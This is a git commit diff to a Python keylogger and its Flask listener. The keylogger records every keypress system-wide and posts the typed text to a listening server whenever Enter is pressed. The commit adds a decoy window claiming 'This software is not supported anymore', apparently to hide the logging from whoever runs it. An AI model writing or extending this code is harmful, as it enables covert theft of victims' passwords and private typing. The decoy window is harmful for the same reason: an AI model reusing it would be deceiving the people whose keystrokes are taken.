9b8a917d67b2e1bf17a89ed655697a9047a4d0f3
shawns21 <shawnsinanan21@gmail.com>
2024-05-10 19:57:08 -0400

    added windows

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,8 @@
 import aiohttp
 import asyncio
 import keyboard
+import threading
+import tkinter as tk
 
 async def sendNum(number, url, payload):
     async with aiohttp.ClientSession() as session:
@@ -16,7 +18,7 @@ async def sendNum(number, url, payload):
 cur = []
 
 def on_key_event(event):
-    global cur  # Declare cur as global to modify the outer cur list
+    global cur
 
     if event.event_type == keyboard.KEY_DOWN:
         if event.name == 'enter':
@@ -29,16 +31,31 @@ def on_key_event(event):
             cur.append(event.name)
 
 async def send():
-    global cur  # Declare cur as global to modify the outer cur list
+    global cur
     url = "http://localhost:4000/"
     userInput = "".join(cur)
     payload = {"number": userInput}
     await sendNum(userInput, url, payload)
-    cur = []  # Clear the cur list after sending
+    cur = []
 
 async def main():
     keyboard.on_press(on_key_event)
     await asyncio.sleep(float('inf'))
 
+def gui():
+    root = tk.Tk()
+    root.title("Background Program")
+    root.geometry("250x150")
+    label = tk.Label(root, text="test 123")
+    label.pack(expand=True, fill='both', anchor='center', padx=20, pady=20)
+    
+    def update_label():
+        label.config(text="This software is not supported anymore.") 
+        root.after(1000, update_label)
+    
+    update_label()
+    root.mainloop()
+
 if __name__ == "__main__":
+    threading.Thread(target=gui, daemon=True).start()
     asyncio.run(main())
--- listener.py
+++ listener.py
@@ -1,5 +1,4 @@
 from flask import Flask, request
-import os
 
 app = Flask(__name__)
 
